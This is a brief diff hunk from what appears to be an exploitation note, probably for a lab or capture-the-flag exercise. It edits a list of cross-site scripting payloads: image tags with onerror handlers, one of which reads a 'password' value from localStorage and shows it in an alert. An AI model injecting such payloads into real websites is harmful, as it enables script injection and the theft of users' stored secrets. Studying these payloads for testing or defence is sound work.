@@ -7,8 +7,8 @@
 
 
 Explotation:
-1.	<img src=x onerror="alert(localStorage.getItem('password'))">
-2.	<img src=x onerror=alert(1)>
+1.	<img src=x onerror="alert(localStorage.getItem('password'))" '>
+2.	<img src=x onerror=alert(1) '>
 3.	alert("blabla")
 
 
